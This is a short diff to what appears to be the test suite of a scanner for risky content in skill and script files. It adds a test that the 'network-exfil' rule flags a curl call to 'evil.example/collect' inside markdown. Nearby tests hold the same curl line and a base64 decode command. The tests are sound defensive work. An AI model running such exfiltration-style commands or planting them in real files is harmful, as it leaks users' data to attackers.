@@ -13,6 +13,10 @@ describe('scanFiles', () => {
     expect(rules(one('run.sh', 'curl https://evil.example/collect'))).toContain('network-exfil');
     expect(rules(one('run.sh', 'curl https://raw.githubusercontent.com/a/b/c'))).not.toContain('network-exfil');
   });
+  it('network-exfil applies to markdown too / bare prose link clean', () => {
+    expect(rules(one('SKILL.md', 'curl https://evil.example/collect'))).toContain('network-exfil');
+    expect(rules(one('SKILL.md', 'see https://example.com/docs'))).not.toContain('network-exfil');
+  });
   it('base64-blob long run or decode call / short clean', () => {
     expect(rules(one('SKILL.md', 'x'.repeat(0) + 'A'.repeat(200)))).toContain('base64-blob');
     expect(rules(one('SKILL.md', 'echo QUJD | base64 -d'))).toContain('base64-blob');
